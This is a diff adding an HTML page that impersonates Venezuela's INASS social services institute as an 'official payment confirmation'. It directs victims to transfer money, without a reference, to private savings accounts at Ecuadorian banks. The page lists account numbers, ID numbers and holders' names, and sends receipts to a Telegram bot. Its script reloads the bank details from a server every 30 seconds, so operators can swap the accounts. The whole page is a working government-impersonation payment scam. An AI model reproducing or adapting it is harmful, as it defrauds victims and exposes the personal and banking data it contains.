@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+    <title>Confirmación Oficial de Pago — Venezuela</title>
+
+    <link rel="icon" type="image/png" href="https://avatars.mds.yandex.net/get-entity_search/113983/603492168/S600xU_2x" />
+
+    <style>*,*::before,*::after{box-sizing:border-box}
+
+        body{
+            margin:0;
+            padding:16px;
+            font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+            background:#F5F7FA;
+            color:#1F2937;
+        }
+
+        /* NOTIFICACIÓN DE ACTUALIZACIÓN */
+        .update-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a5f5c;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 60px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            z-index: 10001;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(8px);
+        }
+        .update-toast:hover {
+            background: #0d403e;
+            transform: translateX(-50%) scale(1.02);
+        }
+        .update-toast button {
+            background: white;
+            border: none;
+            padding: 5px 12px;
+            border-radius: 40px;
+            font-weight: bold;
+            color: #1a5f5c;
+            cursor: pointer;
+        }
+
+        .main-content {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .main-content.visible {
+            display: block;
+            opacity: 1;
+        }
+
+        .page{
+            max-width:500px;
+            margin:0 auto;
+            min-height:100vh;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+        }
+
+        .card{
+            width:100%;
+            background:#ffffff;
+            border-radius:28px;
+            padding:22px 18px 26px;
+            box-shadow:0 10px 30px rgba(15,23,42,.12);
+        }
+
+        header{
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            text-align:center;
+            gap:8px;
+            margin-bottom:18px;
+        }
+
+        .emblem{
+            width:120px;
+            height:auto;
+            border-radius:50%;
+            box-shadow:0 4px 10px rgba(15,23,42,.25);
+            background:white;
+            padding:5px;
+        }
+
+        .country{
+            font-size:1rem;
+            font-weight:700;
+            letter-spacing:.06em;
+            text-transform:uppercase;
+            color:#1a5f5c;
+        }
+
+        .ministry{
+            font-size:.9rem;
+            color:#4B5563;
+        }
+
+        .main-title{
+            margin:4px 0 0;
+            font-size:1.15rem;
+            font-weight:700;
+            color:#1F2937;
+        }
+
+        .desc{
+            font-size:.9rem;
+            color:#374151;
+            text-align:center;
+            margin-bottom:18px;
+            line-height:1.5;
+        }
+
+        .desc strong{font-weight:700; color:#1a5f5c;}
+
+        .alert-warning{
+            position:relative;
+            display:flex;
+            align-items:flex-start;
+            gap:10px;
+            margin-bottom:20px;
+            padding:12px 14px;
+            border-radius:20px;
+            background:#FEFCE8;
+            border-left:5px solid #EAB308;
+            font-size:.8rem;
+            color:#854D0E;
+            line-height:1.5;
+        }
+        .alert-icon{font-size:1.3rem;margin-top:1px;}
+        .alert-text strong{font-weight:800;}
+        .alert-close{
+            position:absolute;
+            top:8px;
+            right:8px;
+            border:none;
+            background:transparent;
+            font-size:.9rem;
+            cursor:pointer;
+            color:#9ca3af;
+        }
+
+        .banks-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .bank-card-selector {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 20px;
+            padding: 16px 20px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .bank-card-selector:hover {
+            border-color: #1a5f5c;
+            background: #e6f7f5;
+            transform: translateX(4px);
+        }
+        .bank-card-selector.selected {
+            border-color: #1a5f5c;
+            background: linear-gradient(135deg, #e6f7f5, #ffffff);
+            box-shadow: 0 6px 14px rgba(26,95,92,0.15);
+        }
+        .bank-logo-large {
+            width: 60px;
+            height: 60px;
+            background: white;
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            flex-shrink: 0;
+        }
+        .bank-logo-large img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .bank-info-large {
+            flex: 1;
+        }
+        .bank-name-large {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: #0f172a;
+            margin-bottom: 4px;
+        }
+        .bank-hint {
+            font-size: 0.75rem;
+            color: #6b7280;
+        }
+        .check-icon {
+            width: 28px;
+            height: 28px;
+            background: #e2e8f0;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.1rem;
+            color: #64748b;
+        }
+        .bank-card-selector.selected .check-icon {
+            background: #1a5f5c;
+            color: white;
+        }
+
+        .bank-details-panel {
+            background: #e6f7f5;
+            border-radius: 24px;
+            padding: 20px 18px;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+            border: 1px solid #b2dfdb;
+        }
+        .selected-bank-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 18px;
+            padding-bottom: 12px;
+            border-bottom: 2px dashed #b2dfdb;
+        }
+        .selected-logo {
+            width: 48px;
+            height: 48px;
+            background: white;
+            border-radius: 16px;
+            padding: 6px;
+        }
+        .selected-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .selected-name {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: #1a5f5c;
+        }
+        .btn-change-bank {
+            margin-left: auto;
+            background: #e2e8f0;
+            border: none;
+            border-radius: 40px;
+            padding: 8px 16px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #334155;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-change-bank:hover {
+            background: #cbd5e1;
+        }
+        .field-group {
+            margin-bottom: 14px;
+        }
+        .field-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: #6b7280;
+            margin: 0 0 5px;
+            font-weight: 600;
+        }
+        .field-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+            padding: 11px 14px;
+            border-radius: 16px;
+            background: #ffffff;
+            border: 1px solid #b2dfdb;
+        }
+        .field-value {
+            flex: 1;
+            font-family: 'SF Mono', monospace;
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: #0f172a;
+            word-break: break-all;
+        }
+        .copy-btn {
+            flex: none;
+            background: #e6f7f5;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: #1a5f5c;
+            cursor: pointer;
+        }
+        .note {
+            margin-top: 12px;
+            font-size: 0.75rem;
+            color: #6b7280;
+            text-align: center;
+        }
+        .manager-block {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #e5e7eb;
+            text-align: center;
+        }
+        .manager-title {
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: #1a5f5c;
+        }
+        .cta-btn {
+            width: 100%;
+            border: none;
+            border-radius: 60px;
+            padding: 12px;
+            background: linear-gradient(90deg, #1a5f5c, #0d403e);
+            color: white;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .disclaimer {
+            font-size: 0.7rem;
+            text-align: center;
+            color: #6b7280;
+            margin-top: 16px;
+        }
+
+        .pre-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        .pre-modal-content {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            padding: 28px 24px;
+            text-align: center;
+            animation: fadeSlideUp 0.4s ease;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .pre-modal-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .pre-modal-title {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #1a5f5c;
+            margin-bottom: 16px;
+        }
+        .pre-modal-text {
+            font-size: 1rem;
+            line-height: 1.5;
+            color: #1f2937;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .pre-modal-text p {
+            margin: 12px 0;
+        }
+        .pre-modal-list {
+            text-align: left;
+            margin: 16px 0;
+            padding-left: 20px;
+        }
+        .pre-modal-list li {
+            margin: 10px 0;
+            font-weight: 500;
+        }
+        .pre-modal-btn {
+            background: linear-gradient(90deg, #1a5f5c, #0d403e);
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 60px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        @keyframes fadeSlideUp {
+            from { opacity: 0; transform: translateY(30px);}
+            to { opacity: 1; transform: translateY(0);}
+        }
+
+        .admin-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .admin-modal.active { display: flex; }
+        .admin-content {
+            background: white;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 520px;
+            max-height: 90vh;
+            overflow-y: auto;
+            padding: 24px;
+        }
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .admin-close {
+            background: #ef4444;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            cursor: pointer;
+        }
+        .admin-input, .admin-select, .admin-textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 12px;
+            border: 1px solid #cbd5e1;
+            border-radius: 12px;
+        }
+        .admin-btn {
+            padding: 10px 16px;
+            border-radius: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+        .admin-btn.save { background: #10b981; color: white; }
+        .admin-btn.delete { background: #ef4444; color: white; }
+        .admin-bank-section {
+            background: #f1f5f9;
+            padding: 12px;
+            border-radius: 16px;
+            margin-bottom: 16px;
+        }
+        .admin-switch {
+            position: relative;
+            display: inline-block;
+            width: 44px;
+            height: 22px;
+        }
+        .admin-switch input { opacity: 0; width: 0; height: 0; }
+        .admin-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            border-radius: 34px;
+        }
+        .admin-slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            border-radius: 50%;
+        }
+        .admin-switch input:checked + .admin-slider { background-color: #10b981; }
+        .admin-section { display: none; }
+        .admin-section.active { display: block; }
+        .admin-status { margin-top: 12px; padding: 8px; border-radius: 12px; text-align: center; display: none; }
+        .admin-status.success { display: block; background: #d1fae5; color: #065f46; }
+        .admin-status.error { display: block; background: #fee2e2; color: #991b1b; }
+        .add-bank-section {
+            background: #f0f9ff;
+            padding: 12px;
+            border-radius: 16px;
+            margin: 12px 0;
+        }
+    </style>
+</head>
+<body>
+
+<!-- MODAL INICIAL -->
+<div id="preModal" class="pre-modal">
+    <div class="pre-modal-content">
+        <div class="pre-modal-icon">⚠️</div>
+        <div class="pre-modal-title">¡Importante!</div>
+        <div class="pre-modal-text">
+            <p><strong>Estimado cliente, al realizar el pago, no escriba ningún comentario ni referencia.</strong></p>
+            <p>Solo debe colocar <strong>su nombre completo</strong> en el concepto de la transferencia.</p>
+            <p>✅ Así podremos identificar su pago rápidamente y agilizar el trámite.</p>
+            <p><strong>💸 Medios de pago obligatorios:</strong></p>
+            <ul class="pre-modal-list">
+                <li>⚡ Solamente a través del sistema de <strong>transferencia bancaria (SPI)</strong> desde tu banca en línea.</li>
+            </ul>
+            <p style="margin-top: 16px; background: #fff3e0; padding: 8px; border-radius: 12px;">
+                🔁 <strong>No olvides:</strong> después de pagar, envía el comprobante a tu gestor.
+            </p>
+        </div>
+        <button id="acceptReminderBtn" class="pre-modal-btn">Continuar → Ver datos bancarios</button>
+    </div>
+</div>
+
+<div class="main-content" id="mainContent">
+<div class="page">
+    <div class="card">
+        <header>
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRNKBCjkldV9smCSDmSLS6xBOlsUpZjefwAGv_U-HfANy85CTAu112f_37LVPqzsY5OcRupE9CVbgqg4E5kwLM5FEVQ7Kv6ouI8VBT-Q&s=10" class="emblem" />
+            <div class="country" id="countryTitle">REPÚBLICA BOLIVARIANA DE VENEZUELA</div>
+            <div class="ministry" id="ministryTitle">Instituto Nacional de Servicios Sociales (INASS)</div>
+            <div class="main-title" id="pageTitle">Confirmación Oficial de Pago</div>
+        </header>
+
+        <p class="desc" id="pageDesc">Pago único por los servicios de <strong>INASS</strong> — gestión: <strong>«PAGO ESTATAL APROBADO»</strong>.</p>
+
+        <div class="alert-warning" id="alertWarning">
+            <div class="alert-icon">⚠️</div>
+            <div class="alert-text" id="alertText"><strong>Importante:</strong> Realiza el pago únicamente mediante transferencia bancaria (SPI / Banco Pichincha / Banco Guayaquil).<br>No escribas comentarios en la transferencia.</div>
+            <button class="alert-close" onclick="this.closest('.alert-warning').remove()">✕</button>
+        </div>
+
+        <div class="banks-grid" id="banksGrid"></div>
+        <div id="bankDetailsPanel" style="display: none;"></div>
+
+        <div class="manager-block">
+            <div class="manager-title">📎 Enviar comprobante al gestor</div>
+            <a href="https://t.me/MariaRomero_Credito_bot" target="_blank" id="telegramLinkAnchor"><button class="cta-btn">Enviar comprobante</button></a>
+        </div>
+        <p class="disclaimer">Verifica los datos antes de transferir. Copia y pega sin espacios extra.</p>
+    </div>
+</div>
+</div>
+
+<script>
+    let currentConfig = {};
+    let selectedBankId = null;
+    let lastConfigHash = "";
+    let autoRefreshInterval = null;
+
+    // Функция для вычисления хеша конфигурации (чтобы сравнивать)
+    function getConfigHash(config) {
+        return JSON.stringify({
+            banks: config.banks,
+            telegram: config.telegram,
+            page: config.page,
+            alert: config.alert
+        });
+    }
+
+    // Показать уведомление об обновлении
+    function showUpdateNotification() {
+        // Удаляем старое уведомление если есть
+        const oldToast = document.querySelector('.update-toast');
+        if(oldToast) oldToast.remove();
+        
+        const toast = document.createElement('div');
+        toast.className = 'update-toast';
+        toast.innerHTML = `
+            <span>🔄</span>
+            <span>¡Los datos bancarios han sido actualizados!</span>
+            <button id="refreshDataBtn">Actualizar</button>
+        `;
+        document.body.appendChild(toast);
+        
+        document.getElementById('refreshDataBtn')?.addEventListener('click', () => {
+            loadConfig(true); // Принудительная загрузка
+            toast.remove();
+        });
+        
+        // Автоматически скрыть через 15 секунд
+        setTimeout(() => {
+            if(toast && toast.parentNode) toast.remove();
+        }, 15000);
+    }
+
+    function loadConfig(silent = false) {
+        fetch('get_config_ec.php?_=' + Date.now())
+            .then(res => res.json())
+            .then(config => {
+                const newHash = getConfigHash(config);
+                const hasChanged = (lastConfigHash !== "" && lastConfigHash !== newHash);
+                
+                currentConfig = config;
+                lastConfigHash = newHash;
+                applyConfig();
+                
+                // Если данные изменились и это не первая загрузка - показать уведомление
+                if(hasChanged && !silent) {
+                    showUpdateNotification();
+                }
+            })
+            .catch(() => {
+                if(!silent) {
+                    currentConfig = getDefaultConfig();
+                    applyConfig();
+                }
+            });
+    }
+
+    function getDefaultConfig() {
+        return {
+            banks: {
+                pichincha: { enabled: true, name: "Banco Pichincha", account_type: "Cuenta de Ahorros", account_number: "2215506131", cedula: "0909015547", full_name: "Anicia Pilligua Sellan", logo: "https://upload.wikimedia.org/wikipedia/commons/c/cc/Banco-Pichincha.png" },
+                guayaquil: { enabled: true, name: "Banco Guayaquil", account_type: "Cuenta de Ahorros", account_number: "0057065057", cedula: "0927686691", full_name: "Huayamabe Pilligua Ingrid Fabiola", logo: "https://vectorseek.com/wp-content/uploads/2023/09/Banco-de-Guayaquil-Logo-Vector.svg-.png" }
+            },
+            telegram: "https://t.me/MariaRomero_Credito_bot",
+            page: { country_title: "REPÚBLICA BOLIVARIANA DE VENEZUELA", ministry: "Instituto Nacional de Servicios Sociales (INASS)", title: "Confirmación Oficial de Pago", service_name: "INASS", service_type: "PAGO ESTATAL APROBADO" },
+            alert: { enabled: true, text: "<strong>Importante:</strong> Realiza el pago únicamente mediante transferencia bancaria (SPI / Banco Pichincha / Banco Guayaquil).<br>No escribas comentarios en la transferencia." }
+        };
+    }
+
+    function applyConfig() {
+        document.getElementById('countryTitle').innerText = currentConfig.page?.country_title || 'REPÚBLICA BOLIVARIANA DE VENEZUELA';
+        document.getElementById('ministryTitle').innerText = currentConfig.page?.ministry || '';
+        document.getElementById('pageTitle').innerText = currentConfig.page?.title || '';
+        const descP = document.getElementById('pageDesc');
+        if(descP && currentConfig.page) descP.innerHTML = `Pago único por los servicios de <strong>${currentConfig.page.service_name}</strong> — gestión: <strong>«${currentConfig.page.service_type}»</strong>.`;
+        const alertDiv = document.getElementById('alertText');
+        if(alertDiv && currentConfig.alert?.text) alertDiv.innerHTML = currentConfig.alert.text;
+        const tgLink = document.getElementById('telegramLinkAnchor');
+        if(tgLink && currentConfig.telegram) tgLink.href = currentConfig.telegram;
+        
+        // Сохраняем выбранный банк до перерисовки
+        const oldSelectedBankId = selectedBankId;
+        renderBanksGrid();
+        // Восстанавливаем выбранный банк если он ещё существует
+        if(oldSelectedBankId && currentConfig.banks[oldSelectedBankId]) {
+            selectedBankId = oldSelectedBankId;
+            renderBanksGrid();
+            showBankDetails(oldSelectedBankId);
+        } else if(Object.keys(currentConfig.banks || {}).length > 0) {
+            // Если выбранного банка больше нет, выбираем первый доступный
+            const firstBank = Object.keys(currentConfig.banks).find(key => currentConfig.banks[key].enabled !== false);
+            if(firstBank) {
+                selectedBankId = firstBank;
+                renderBanksGrid();
+                showBankDetails(firstBank);
+            }
+        }
+    }
+
+    function renderBanksGrid() {
+        const grid = document.getElementById('banksGrid');
+        if(!grid) return;
+        grid.innerHTML = '';
+        const activeBanks = Object.entries(currentConfig.banks || {}).filter(([_, b]) => b.enabled !== false);
+        if(activeBanks.length === 0) { grid.innerHTML = '<p style="text-align:center">No hay bancos disponibles</p>'; return; }
+
+        activeBanks.forEach(([bankId, bank]) => {
+            const card = document.createElement('div');
+            card.className = `bank-card-selector ${selectedBankId === bankId ? 'selected' : ''}`;
+            card.dataset.bankid = bankId;
+            const logoUrl = bank.logo && bank.logo.trim() !== '' ? bank.logo : 'https://cdn-icons-png.flaticon.com/512/2830/2830284.png';
+            card.innerHTML = `
+                <div class="bank-logo-large"><img src="${logoUrl}" alt="logo" loading="lazy" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2830/2830284.png'"></div>
+                <div class="bank-info-large">
+                    <div class="bank-name-large">${escapeHtml(bank.name)}</div>
+                    <div class="bank-hint">Haz clic para seleccionar</div>
+                </div>
+                <div class="check-icon">${selectedBankId === bankId ? '✓' : ''}</div>
+            `;
+            card.addEventListener('click', () => selectBank(bankId));
+            grid.appendChild(card);
+        });
+    }
+
+    function selectBank(bankId) {
+        selectedBankId = bankId;
+        renderBanksGrid();
+        showBankDetails(bankId);
+    }
+
+    function showBankDetails(bankId) {
+        const bank = currentConfig.banks[bankId];
+        if(!bank) return;
+        const panel = document.getElementById('bankDetailsPanel');
+        panel.style.display = 'block';
+        const logoUrl = bank.logo && bank.logo.trim() !== '' ? bank.logo : 'https://cdn-icons-png.flaticon.com/512/2830/2830284.png';
+        panel.innerHTML = `
+            <div class="bank-details-panel">
+                <div class="selected-bank-header">
+                    <div class="selected-logo"><img src="${logoUrl}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2830/2830284.png'"></div>
+                    <div class="selected-name">${escapeHtml(bank.name)}</div>
+                    <button class="btn-change-bank" id="changeBankBtn">↺ Cambiar banco</button>
+                </div>
+                <div class="field-group"><div class="field-label">Tipo de cuenta</div><div class="field-box"><span class="field-value" id="detail_tipo">${escapeHtml(bank.account_type || 'Cuenta de Ahorros')}</span><button class="copy-btn" data-copy="detail_tipo">Copiar</button></div></div>
+                <div class="field-group"><div class="field-label">Número de cuenta</div><div class="field-box"><span class="field-value" id="detail_numero">${escapeHtml(bank.account_number || '')}</span><button class="copy-btn" data-copy="detail_numero">Copiar</button></div></div>
+                <div class="field-group"><div class="field-label">Cédula</div><div class="field-box"><span class="field-value" id="detail_cedula">${escapeHtml(bank.cedula || bank.ci_number || '')}</span><button class="copy-btn" data-copy="detail_cedula">Copiar</button></div></div>
+                <div class="field-group"><div class="field-label">Nombre del titular</div><div class="field-box"><span class="field-value" id="detail_titular">${escapeHtml(bank.full_name || '')}</span><button class="copy-btn" data-copy="detail_titular">Copiar</button></div></div>
+            </div>
+        `;
+        document.getElementById('changeBankBtn')?.addEventListener('click', () => {
+            selectedBankId = null;
+            renderBanksGrid();
+            panel.style.display = 'none';
+        });
+        attachCopyEvents();
+    }
+
+    function attachCopyEvents() {
+        document.querySelectorAll('.copy-btn').forEach(btn => {
+            btn.removeEventListener('click', copyHandler);
+            btn.addEventListener('click', copyHandler);
+        });
+    }
+    async function copyHandler(e) {
+        const btn = e.currentTarget;
+        const targetId = btn.getAttribute('data-copy');
+        const el = document.getElementById(targetId);
+        if(!el) return;
+        const text = el.innerText.trim();
+        if(!text) return;
+        try {
+            await navigator.clipboard.writeText(text);
+            const original = btn.innerText;
+            btn.innerText = '✔ Copiado';
+            setTimeout(() => btn.innerText = original, 1200);
+        } catch(err) { alert('No se pudo copiar'); }
+    }
+
+    function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
+    document.getElementById('acceptReminderBtn').addEventListener('click', () => {
+        document.getElementById('preModal').style.display = 'none';
+        document.getElementById('mainContent').classList.add('visible');
+        // Запускаем автообновление после того как пользователь закрыл модалку
+        startAutoRefresh();
+    });
+    
+    // Запуск автоматической проверки обновлений каждые 30 секунд
+    function startAutoRefresh() {
+        if(autoRefreshInterval) clearInterval(autoRefreshInterval);
+        autoRefreshInterval = setInterval(() => {
+            loadConfig(true); // Тихая проверка обновлений
+        }, 30000); // Проверка каждые 30 секунд
+    }
+    
+    function stopAutoRefresh() {
+        if(autoRefreshInterval) {
+            clearInterval(autoRefreshInterval);
+            autoRefreshInterval = null;
+        }
+    }
+    
+    document.addEventListener('DOMContentLoaded', () => { 
+        loadConfig();
+    });
+</script>
+</body>
+</html>
